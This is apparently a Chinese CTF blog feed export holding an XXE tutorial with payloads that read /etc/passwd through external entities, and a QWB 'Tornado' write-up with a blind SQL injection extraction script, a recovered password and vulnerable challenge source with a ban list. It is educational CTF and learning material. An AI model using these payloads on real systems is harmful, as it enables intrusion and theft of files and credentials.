alt="在这里插入图片描述"></p><p><code>flag&#123;632e6e01-d5aa-400a-9f91-bc3c4856fc96&#125;</code>。</p><p>终于做出来了，这两天学xxe也学到了很多，虽然有个小错误浪费了我很多时间，但找错误的过程也学了很多，这个暑假把XSS的知识得好好学学，还有JS的代码也得认真学学了，西湖论剑的那个方法还没咋看懂，再学学js再看。</p><p>参考文章</p><p><a href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20201019-sw_safe.html">https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20201019-sw_safe.html</a></p><p><a href="https://blog.funnything.net/2021/06/15/2021-qwb-web-harderxss-writeup/">https://blog.funnything.net/2021/06/15/2021-qwb-web-harderxss-writeup/</a></p><p><a href="https://www.icystal.top/ctf15-qwb2021harderxss/">https://www.icystal.top/ctf15-qwb2021harderxss/</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2021/07/20/2021-7-21-XXE%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/07/20/2021-7-21-XXE%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="XXE学习"><a href="#XXE学习" class="headerlink" title="XXE学习"></a>XXE学习</h1><h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><h4 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h4><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p><p>第一行XML的声明，第二行<note> 为根元素， 下面的to, from,heading和body 都是子元素</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>  //XML声明<br><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>  //文档类型定义<br>    <br>//文档元素<br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a>XML DTD</h4><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 有两种声明的方法，一种是内部声明，一种是外部声明，我们下面开具体看一下：</p><p>DTD的内部声明：根元素 [元素声明]&gt;： </p><p>例如<!DOCTYOE test any></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">heading</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>外部声明 根元素 SYSTEM “文件名”&gt; 或 根元素 PUBLIC “public_ID” “文件名”&gt; </p><p>例如<!DOCTYPE test SYSTEM 'http://www.test.com/evil.dtd'></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;note.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>George<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>John<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span> <br></code></pre></div></td></tr></table></figure><h4 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h4><p>实体又分为一般实体和参数实体<br>1，一般实体的声明语法:<br>引用实体的方式：&amp;实体名<br>2，参数实体只能在DTD中使用，参数实体的声明格式：<br>引用实体的方式：%实体名</p><p>内部实体声明: ex:<code>&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">writer</span> <span class="hljs-meta-string">&quot;Bill Gates&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>引用外部实体：</p><p><code>实体名称 SYSTEM &quot;URI&quot;&gt;</code>或者<code>实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">writer</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE"></a>什么是XXE</h3><p>简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><p>例如，如果你当前使用的程序为PHP，则可以将libxml_disable_entity_loader设置为TRUE来禁用外部实体，从而起到防御的目的。</p><h3 id="基本利用"><a href="#基本利用" class="headerlink" title="基本利用"></a>基本利用</h3><h4 id="XML外部实体注入"><a href="#XML外部实体注入" class="headerlink" title="XML外部实体注入"></a>XML外部实体注入</h4><p>通过DTD外部实体声明:</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>通过DTDy引入外部DTD再引入外部实体声明</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>DTD文件内容：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>不同程序支持的协议不同</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d408adb6e9e833ca14fb08b299914c16.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QWB托纳多</title>
    <link href="/2021/07/16/2021-7-16-QWB%E6%89%98%E7%BA%B3%E5%A4%9A/"/>
    <url>/2021/07/16/2021-7-16-QWB%E6%89%98%E7%BA%B3%E5%A4%9A/</url>
    
    <content type="html"><![CDATA[<h2 id="QWB托纳多"><a href="#QWB托纳多" class="headerlink" title="QWB托纳多"></a>QWB托纳多</h2><p>注册页面存在注入，利用processlist表读取正在执行的sql语句，从而得到表名与列名。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><span class="hljs-comment"># string = string.ascii_letters + string.digits</span><br><span class="hljs-comment"># print(string)</span><br>payload = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>,<span class="hljs-number">130</span>):<br>        <span class="hljs-comment"># payload = url  + &quot;username=&quot; + &quot;&#x27; or if(ascii(substr(select FILE_NAME FROM performance_schema.file_instances limit 150,1))&gt;&quot;</span><br>        url = <span class="hljs-string">&quot;http://5af86460-e42f-4f41-9eb0-b2ce7064ae5d.node4.buuoj.cn/register.php?username=&#x27; or  if((ascii(substr((select INFO  FROM information_schema.processlist limit 0,1),&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;,1)) in (&quot;</span>+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&quot;)),1,0) or &#x27;0&amp;password=12&quot;</span><br>        <span class="hljs-comment"># print(url)</span><br>        <span class="hljs-comment"># s = requests.session()</span><br>        <span class="hljs-comment"># print(url)</span><br>        r = requests.get(url)<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;this username&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            payload += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(payload)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><p>跑出来是<code>SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where  qwbqwbqwbuser=&#39;&#39; or  if((ascii(substr((select INFO  FROM information_schema.processlist limit 0,1),1后面就是payload，省略</code></p><p>可以看到表为<code>qwbtttaaab111e</code>，字段为<code>qwbqwbqwbuser,qwbqwbqwbpass</code></p><p>则payload为<code>username=&#39; or  if((ascii(substr((select qwbqwbqwbpass FROM qwbtttaaab111e limit 0,1),&quot;+str(i)+&quot;,1)) in (&quot;+str(j)+&quot;)),1,0) or &#39;0&amp;password=12&quot;</code></p><p>得到密码，glzjin666888</p><p><img src="https://img-blog.csdnimg.cn/20210717211514175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>但是buu上好像无法登录不知道为什么。直接找到源码审计吧</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.ioloop, tornado.web, tornado.options, pymysql, os, re<br>settings = &#123;<span class="hljs-string">&#x27;static_path&#x27;</span>: os.path.join(os.getcwd(), <span class="hljs-string">&#x27;static&#x27;</span>),<br> <span class="hljs-string">&#x27;cookie_secret&#x27;</span>: <span class="hljs-string">&#x27;b93a9960-bfc0-11eb-b600-002b677144e0&#x27;</span>&#125;<br>db_username = <span class="hljs-string">&#x27;root&#x27;</span><br>db_password = <span class="hljs-string">&#x27;xxxx&#x27;</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        user = self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>)<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">and</span> user == <span class="hljs-string">b&#x27;admin&#x27;</span>:<br>            self.redirect(<span class="hljs-string">&#x27;/admin.php&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">return</span><br>        self.render(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        username = self.get_argument(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        password = self.get_argument(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>):<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`please input your password and username`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">if</span> self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>) == <span class="hljs-string">b&#x27;admin&#x27;</span>:<br>                self.redirect(<span class="hljs-string">&#x27;/admin.php&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">else</span>:<br>                self.redirect(<span class="hljs-string">&#x27;/&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">else</span>:<br>            conn = pymysql.connect(<span class="hljs-string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="hljs-string">&#x27;qwb&#x27;</span>)<br>            cursor = conn.cursor()<br>            cursor.execute(<span class="hljs-string">&#x27;SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s&#x27;</span>, [username, password])<br>            results = cursor.fetchall()<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(results) != <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> results[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>                    self.set_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>)<br>                    cursor.close()<br>                    conn.commit()<br>                    conn.close()<br>                    self.redirect(<span class="hljs-string">&#x27;/admin.php&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>                    <span class="hljs-keyword">return</span><br>                <span class="hljs-keyword">else</span>:<br>                    cursor.close()<br>                    conn.commit()<br>                    conn.close()<br>                    self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`login success, but only admin can get flag`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                    <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">else</span>:<br>                cursor.close()<br>                conn.commit()<br>                conn.close()<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`your username or password is error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RegisterHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        username = self.get_argument(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        password = self.get_argument(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        word_bans = [<span class="hljs-string">&#x27;table&#x27;</span>, <span class="hljs-string">&#x27;col&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;union&#x27;</span>, <span class="hljs-string">&#x27;inno&#x27;</span>, <span class="hljs-string">&#x27;like&#x27;</span>, <span class="hljs-string">&#x27;regexp&#x27;</span>]<br>        bans = [<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;--&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>]<br>        <span class="hljs-keyword">for</span> ban <span class="hljs-keyword">in</span> word_bans:<br>            <span class="hljs-keyword">if</span> re.search(ban, username, re.IGNORECASE):<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">for</span> ban <span class="hljs-keyword">in</span> bans:<br>            <span class="hljs-keyword">if</span> ban <span class="hljs-keyword">in</span> username:<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:<br>            self.render(<span class="hljs-string">&#x27;register.html&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            self.render(<span class="hljs-string">&#x27;register.html&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        conn = pymysql.connect(<span class="hljs-string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="hljs-string">&#x27;qwb&#x27;</span>)<br>        cursor = conn.cursor()<br>        <span class="hljs-keyword">try</span>:<br>            cursor.execute(<span class="hljs-string">&quot;SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser=&#x27;%s&#x27;&quot;</span> % username)<br>            results = cursor.fetchall()<br>            <span class="hljs-keyword">if</span> <span 